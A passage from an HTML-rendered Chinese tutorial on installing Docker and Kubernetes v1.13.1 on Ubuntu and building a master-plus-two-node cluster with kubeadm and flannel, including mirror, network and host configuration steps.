class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>重启，登录确认<code>docker</code>已经运行</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">itcast@ubuntu:~$ <span class="token function">sudo</span> docker <span class="token function">ps</span> CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="3-4-docker配置国内镜像加速器"><a href="#3-4-docker配置国内镜像加速器" class="headerlink" title="3.4 docker配置国内镜像加速器"></a>3.4 docker配置国内镜像加速器</h5><blockquote><p>目的 : 为了下载docker镜像更快</p></blockquote><p>您可以通过修改<code>daemon</code>配置文件<code>/etc/docker/daemon.json</code>来使用加速器。</p><p>创建<code>/etc/docker/daemon.json</code>文件，内容如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://ozcouv1b.mirror.aliyuncs.com"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启docker服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 重载所有修改过的配置文件</span><span class="token function">sudo</span> systemctl daemon-reload<span class="token comment"># 重启Docker服务</span><span class="token function">sudo</span> systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、Kubernetes-安装及部署"><a href="#四、Kubernetes-安装及部署" class="headerlink" title="四、Kubernetes 安装及部署"></a>四、Kubernetes 安装及部署</h3><h4 id="4-1-k8s安装环境准备"><a href="#4-1-k8s安装环境准备" class="headerlink" title="4.1 k8s安装环境准备"></a>4.1 k8s安装环境准备</h4><h5 id="4-1-1-配置并安装k8s国内源"><a href="#4-1-1-配置并安装k8s国内源" class="headerlink" title="4.1.1 配置并安装k8s国内源"></a>4.1.1 配置并安装k8s国内源</h5><ol><li><p>创建配置文件<code>sudo touch /etc/apt/sources.list.d/kubernetes.list</code> </p></li><li><p>添加写权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~$ <span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">666</span> /etc/apt/sources.list.d/kubernetes.list <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再添加，内容如下:</p><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行<code>sudo apt update</code> 更新操作系统源，开始会遇见如下错误</p></li></ol><pre class="line-numbers language-none"><code class="language-none">tcast@master:~$ sudo apt updateGet:1 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease [8,993 B]Err:1 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease      The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FBHit:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic InRelease                        Hit:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-updates InRelease                Hit:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-backports InRelease              Hit:5 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-security InRelease               Err:6 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu cosmic InRelease        Could not wait for server fd - select (11: Resource temporarily unavailable) [IP: 202.141.176.110 443]Reading package lists... Done                          W: GPG error: http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease: The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FBE: The repository &#39;http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease&#39; is not signed.N: Updating from such a repository can&#39;t be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：</p><pre class="line-numbers language-none"><code class="language-none">The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>签名认证失败，需要重新生成。记住上面的<em>NO_PUBKEY</em> <code>6A030B21BA07F4FB</code></p><ol start="4"><li>添加认证key</li></ol><pre class="line-numbers language-none"><code class="language-none">gpg --keyserver keyserver.ubuntu.com --recv-keys BA07F4FB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着运行如下命令，确认看到<strong>OK</strong>，说明成功，之后进行安装:</p><pre class="line-numbers language-none"><code class="language-none">gpg --export --armor BA07F4FB | sudo apt-key add -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>再次重新<code>sudo apt update</code>更新系统下载源数据列表</li></ol><pre class="line-numbers language-none"><code class="language-none">itcast@master:~$ sudo apt updateHit:1 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu cosmic InRelease                  Hit:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic InRelease                                    Hit:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-updates InRelease                            Hit:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-backports InRelease                          Hit:5 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-security InRelease                           Get:6 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease [8,993 B]      Ign:7 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial&#x2F;main amd64 PackagesGet:7 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial&#x2F;main amd64 Packages [26.6 kB]Fetched 26.6 kB in 42s (635 B&#x2F;s)    Reading package lists... DoneBuilding dependency tree       Reading state information... Done165 packages can be upgraded. Run &#39;apt list --upgradable&#39; to see them.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上没有报和错误异常，表示成功。</p><h5 id="4-1-2-禁止基础设施"><a href="#4-1-2-禁止基础设施" class="headerlink" title="4.1.2 禁止基础设施"></a>4.1.2 禁止基础设施</h5><ol><li><p>禁止防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> ufw disableFirewall stopped and disabled on system startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>关闭swap</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 成功</span>$ <span class="token function">sudo</span> swapoff -a <span class="token comment"># 永久关闭swap分区</span>$ <span class="token function">sudo</span> <span class="token function">sed</span> -i <span class="token string">'s/.*swap.*/#&amp;/'</span> /etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>禁止selinux</p></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 安装操控selinux的命令</span>$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y selinux-utils<span class="token comment"># 禁止selinux</span>$ setenforce <span class="token number">0</span><span class="token comment"># 重启操作系统</span>$ <span class="token function">shutdown</span> -r now<span class="token comment"># 查看selinux是否已经关闭</span>$ <span class="token function">sudo</span> getenforceDisabled<span class="token punctuation">(</span>表示已经关闭<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-k8s系统网络配置"><a href="#4-2-k8s系统网络配置" class="headerlink" title="4.2 k8s系统网络配置"></a>4.2 k8s系统网络配置</h4><p>(1) 配置内核参数，将桥接的IPv4流量传递到iptables的链</p><p>创建<code>/etc/sysctl.d/k8s.conf</code>文件</p><p>添加内容如下:</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">net.bridge.bridge-nf-call-ip6tables</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span><span class="token key attr-name">net.bridge.bridge-nf-call-iptables</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span><span class="token key attr-name">vm.swappiness</span> <span class="token punctuation">=</span> <span class="token value attr-value">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(2) 执行命令使修改生效</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 【候选】建议执行下面的命令</span>$ <span class="token function">sudo</span> modprobe br_netfilter$ <span class="token function">sudo</span> sysctl -p /etc/sysctl.d/k8s.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4-3-安装k8s"><a href="#4-3-安装k8s" class="headerlink" title="4.3 安装k8s"></a>4.3 安装k8s</h4><ol><li><p>安装Kubernetes 目前安装版本  <code>v1.13.1</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y <span class="token assign-left variable">kubelet</span><span class="token operator">=</span><span class="token number">1.13</span>.1-00 kubernetes-cni<span class="token operator">=</span><span class="token number">0.6</span>.0-00 <span class="token assign-left variable">kubeadm</span><span class="token operator">=</span><span class="token number">1.13</span>.1-00 <span class="token assign-left variable">kubectl</span><span class="token operator">=</span><span class="token number">1.13</span>.1-00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置为开机重启</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> kubelet <span class="token operator">&amp;&amp;</span> systemctl start kubelet$ <span class="token function">sudo</span> <span class="token function">shutdown</span> -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="4-4-验证k8s"><a href="#4-4-验证k8s" class="headerlink" title="4.4 验证k8s"></a>4.4 验证k8s</h4><ol><li><p>使用root用户登录<code>Master</code>主机</p></li><li><p>执行如下个命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kubectl get nodes <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>输出如下</p>   <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get nodesThe connection to the server localhost:8080 was refused - did you specify the right <span class="token function">host</span> or port?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li><p>查看当前k8s版本 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ kubectl version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Client Version: version.Info<span class="token punctuation">&#123;</span>Major:<span class="token string">"1"</span>, Minor:<span class="token string">"13"</span>, GitVersion:<span class="token string">"v1.13.1"</span>, GitCommit:<span class="token string">"eec55b9ba98609a46fee712359c7b5b365bdd920"</span>, GitTreeState:<span class="token string">"clean"</span>, BuildDate:<span class="token string">"2018-12-13T10:39:04Z"</span>, GoVersion:<span class="token string">"go1.11.2"</span>, Compiler:<span class="token string">"gc"</span>, Platform:<span class="token string">"linux/amd64"</span><span class="token punctuation">&#125;</span>The connection to the server localhost:8080 was refused - did you specify the right <span class="token function">host</span> or port?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="五、创建企业Kubernetes多主机集群环境"><a href="#五、创建企业Kubernetes多主机集群环境" class="headerlink" title="五、创建企业Kubernetes多主机集群环境"></a>五、创建企业Kubernetes多主机集群环境</h3><h4 id="5-1-创建两个节点-两个虚拟机"><a href="#5-1-创建两个节点-两个虚拟机" class="headerlink" title="5.1 创建两个节点(两个虚拟机)"></a>5.1 创建两个节点(两个虚拟机)</h4><ol><li>在VMWare中创建完整克隆</li></ol><h4 id="5-2-master和node基础配置"><a href="#5-2-master和node基础配置" class="headerlink" title="5.2 master和node基础配置"></a>5.2 master和node基础配置</h4><h5 id="5-2-1-给node配置hostname"><a href="#5-2-1-给node配置hostname" class="headerlink" title="5.2.1 给node配置hostname"></a>5.2.1 给node配置hostname</h5><p><code>node1</code>主机</p><p>/etc/hostname</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">node1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>node2</code>主机</p><p>/et/hostname</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">node2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.确认配置的三台机器的主机名称</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> /etc/hosts$ <span class="token function">shutdown</span> -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-2-2-配置IP地址"><a href="#5-2-2-配置IP地址" class="headerlink" title="5.2.2 配置IP地址"></a>5.2.2 配置IP地址</h5><ul><li>master</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.134/24<span class="token punctuation">]</span>            dhcp4: <span class="token boolean">false</span>            gateway4: <span class="token number">192.168</span>.111.2            nameservers:                       addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.2<span class="token punctuation">]</span>            optional: <span class="token boolean">true</span>    version: <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>node1</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.135/24<span class="token punctuation">]</span>            dhcp4: <span class="token boolean">false</span>            gateway4: <span class="token number">192.168</span>.111.2            nameservers:                       addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.2<span class="token punctuation">]</span>            optional: <span class="token boolean">true</span>    version: <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>node2</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.136/24<span class="token punctuation">]</span>            dhcp4: <span class="token boolean">false</span>            gateway4: <span class="token number">192.168</span>.111.2            nameservers:                       addresses: <span class="token punctuation">[</span><span class="token number">192.168</span>.111.2<span class="token punctuation">]</span>            optional: <span class="token boolean">true</span>    version: <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="5-2-3-修改hosts文件"><a href="#5-2-3-修改hosts文件" class="headerlink" title="5.2.3 修改hosts文件"></a>5.2.3 修改hosts文件</h5><p>注意： (Master、Node1、Node2都需要配置)</p><p>使用root用户登录</p><ol><li><p>打开hosts文件 <code>vim /etc/hosts</code></p></li><li><p>输入如下内容</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">192.168</span>.111.134 master<span class="token number">192.168</span>.111.135 node1<span class="token number">192.168</span>.111.136 node2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>重启机器<code>shutdown -r now</code></p></li></ol><h4 id="5-3-配置Master节点"><a href="#5-3-配置Master节点" class="headerlink" title="5.3 配置Master节点"></a>5.3 配置Master节点</h4><h5 id="5-3-1-创建工作目录"><a href="#5-3-1-创建工作目录" class="headerlink" title="5.3.1 创建工作目录"></a>5.3.1 创建工作目录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mkdir</span> /home/itcast/working$ <span class="token builtin class-name">cd</span> /home/itcast/working/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-3-2-创建kubeadm-conf配置文件"><a href="#5-3-2-创建kubeadm-conf配置文件" class="headerlink" title="5.3.2 创建kubeadm.conf配置文件"></a>5.3.2 创建kubeadm.conf配置文件</h5><ol><li>创建k8s的管理工具<code>kubeadm</code>对应的配置文件，候选操作在<code>home/itcast/working/</code>目录下</li></ol><p>使用kubeadm配置文件，通过在配置文件中指定docker仓库地址，便于内网快速部署。</p><p>生成配置文件</p><pre class="line-numbers language-none"><code class="language-none">kubeadm config print init-defaults ClusterConfiguration &gt; kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改<code>kubeadm.conf </code>中的如下两项:</li></ol><ul><li>imageRepository  </li><li>kubernetesVersion</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> kubeadm.conf<span class="token comment"># 修改 imageRepository: k8s.gcr.io</span><span class="token comment"># 改为 registry.cn-beijing.aliyuncs.com/imcto</span>imageRepository: registry.cn-beijing.aliyuncs.com/imcto<span class="token comment"># 修改kubernetes版本kubernetesVersion: v1.13.0</span><span class="token comment"># 改为kubernetesVersion: v1.13.1</span>kubernetesVersion: v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>修改<code>kubeadm.conf</code>中的API服务器地址，后面会频繁使用这个地址。</li></ol><ul><li>localAPIEndpoint:</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">localAPIEndpoint:  advertiseAddress: <span class="token number">192.168</span>.236.177  bindPort: <span class="token number">6443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意: <code>192.168.236.177</code>是master主机的ip地址</p></blockquote><ol start="4"><li>配置子网网络</li></ol><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">networking:  dnsDomain: cluster.local  podSubnet: 10.244.0.0/16  serviceSubnet: 10.96.0.0/12scheduler: &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>10.244.0.0/16</code> 和 <code>10.96.0.0/12</code>分别是k8s内部pods和services的子网网络，最好使用这个地址，后续flannel网络需要用到。</p><h5 id="5-3-3-拉取K8s必备的模块镜像"><a href="#5-3-3-拉取K8s必备的模块镜像" class="headerlink" title="5.3.3 拉取K8s必备的模块镜像"></a>5.3.3 拉取K8s必备的模块镜像</h5><ol><li>查看一下都需要哪些镜像文件需要拉取</li></ol><pre class="line-numbers language-none"><code class="language-none">$ kubeadm config images list --config kubeadm.confregistry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-apiserver:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-controller-manager:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-scheduler:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-proxy:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;pause:3.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;etcd:3.2.24registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;coredns:1.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>拉取镜像</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#下载全部当前版本的k8s所关联的镜像</span>kubeadm config images pull --config ./kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-3-4-初始化kubernetes环境"><a href="#5-3-4-初始化kubernetes环境" class="headerlink" title="5.3.4 初始化kubernetes环境"></a>5.3.4 初始化kubernetes环境</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#初始化并且启动</span>$ <span class="token function">sudo</span> kubeadm init --config ./kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更多kubeadm配置文件参数详见</p><pre class="line-numbers language-none"><code class="language-none">kubeadm config print-defaults<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>k8s启动成功输出内容较多，但是记住末尾的内容</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Your Kubernetes master has initialized successfully<span class="token operator">!</span>To start using your cluster, you need to run the following as a regular user:  <span class="token function">mkdir</span> -p <span class="token environment constant">$HOME</span>/.kube  <span class="token function">sudo</span> <span class="token function">cp</span> -i /etc/kubernetes/admin.conf <span class="token environment constant">$HOME</span>/.kube/config  <span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -u<span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -g<span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/configYou should now deploy a pod network to the cluster.Run <span class="token string">"kubectl apply -f [podnetwork].yaml"</span> with one of the options listed at:  https://kubernetes.io/docs/concepts/cluster-administration/addons/You can now <span class="token function">join</span> any number of machines by running the following on each nodeas root:  kubeadm <span class="token function">join</span> <span class="token number">192.168</span>.236.177:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:e778d3665e52f5a680a87b00c6d54df726c2eda601c0db3bfa4bb198af2262a8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照官方提示，执行以下操作。</p><ol><li><p>执行如下命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mkdir</span> -p <span class="token environment constant">$HOME</span>/.kube$ <span class="token function">sudo</span> <span class="token function">cp</span> -i /etc/kubernetes/admin.conf <span class="token environment constant">$HOME</span>/.kube/config$ <span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -u<span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -g<span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>创建系统服务并启动</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 启动kubelet 设置为开机自启动</span>$ <span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> kubelet<span class="token comment"># 启动k8s服务程序</span>$ <span class="token function">sudo</span> systemctl start kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h5 id="5-3-5-验证kubernetes启动结果"><a href="#5-3-5-验证kubernetes启动结果" class="headerlink" title="5.3.5 验证kubernetes启动结果"></a>5.3.5 验证kubernetes启动结果</h5><ol><li>验证输入，注意显示master状态是<code>NotReady</code>，证明初始化服务器成功</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get nodesNAME     STATUS     ROLES    AGE   VERSIONmaster   NotReady   master   12m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>查看当前k8s集群状态</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get csNAME                 STATUS    MESSAGE              ERRORscheduler            Healthy   okcontroller-manager   Healthy   oketcd-0               Healthy   <span class="token punctuation">&#123;</span><span class="token string">"health"</span><span class="token builtin class-name">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目前只有一个master，还没有node，而且是NotReady状态，那么我们需要将node加入到master管理的集群中来。在加入之前，我们需要先配置k8s集群的内部通信网络，这里采用的是flannel网络。</p><h5 id="5-3-6-部署集群内部通信flannel网络"><a href="#5-3-6-部署集群内部通信flannel网络" class="headerlink" title="5.3.6 部署集群内部通信flannel网络"></a>5.3.6 部署集群内部通信flannel网络</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cd</span> <span class="token environment constant">$HOME</span>/working<span class="token variable">$wget</span> https://raw.githubusercontent.com/coreos/flannel/a70459be0084506e4ec919aa1c114638878db11b/Documentation/kube-flannel.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑这个文件，确保flannel网络是对的,找到<code> net-conf.json</code>标记的内容是否正确。</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">net-conf.json: |   &#123;     "Network": "10.244.0.0/16",     "Backend": &#123;       "Type": "vxlan"     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这个”10.244.0.0/16”和 ./kubeadm.conf中的podsubnet的地址要一致。</strong></p><p>应用当前flannel配置文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">itcast@master:~/working$ kubectl apply -f kube-flannel.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果如下 </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@master:~/working<span class="token comment"># kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/a70459be0084506e4ec919aa1c114638878db11b/Documentation/kube-flannel.yml</span>clusterrole.rbac.authorization.k8s.io/flannel createdclusterrolebinding.rbac.authorization.k8s.io/flannel createdserviceaccount/flannel createdconfigmap/kube-flannel-cfg createddaemonset.extensions/kube-flannel-ds-amd64 createddaemonset.extensions/kube-flannel-ds-arm64 createddaemonset.extensions/kube-flannel-ds-arm createddaemonset.extensions/kube-flannel-ds-ppc64le createddaemonset.extensions/kube-flannel-ds-s390x created<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装flannel网络前 执行<code>kubectl get nodes</code>输出结果如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~/working$ kubectl get nodeNAME     STATUS     ROLES    AGE   VERSIONmaster   NotReady   master   10m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装flannel网络后 执行<code>kubectl get nodes</code>输出结果如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~/working$ kubectl get nodeNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   10m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时master已经是<code>Ready</code>状态了，表示已经配置成功了，那么我们就需要配置node来加入这个集群。</p><h4 id="5-4-配置Node"><a href="#5-4-配置Node" class="headerlink" title="5.4 配置Node"></a>5.4 配置Node</h4><h5 id="5-4-1-确认外部环境"><a href="#5-4-1-确认外部环境" class="headerlink" title="5.4.1 确认外部环境"></a>5.4.1 确认外部环境</h5><ol><li><p>确认关闭swap </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">apt</span> <span class="token function">install</span> -y selinux-utilsswapoff -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>禁止selinux</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">setenforce <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>确认关闭防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ufw disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h5 id="5-4-2-配置k8s集群的Node主机环境"><a href="#5-4-2-配置k8s集群的Node主机环境" class="headerlink" title="5.4.2 配置k8s集群的Node主机环境"></a>5.4.2 配置k8s集群的Node主机环境</h5><ol><li><p>启动k8s后台服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 启动kubelet 设置为开机自启动</span>$ <span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> kubelet<span class="token comment"># 启动k8s服务程序</span>$ <span class="token function">sudo</span> systemctl start kubelet<span aria-hidden="true" 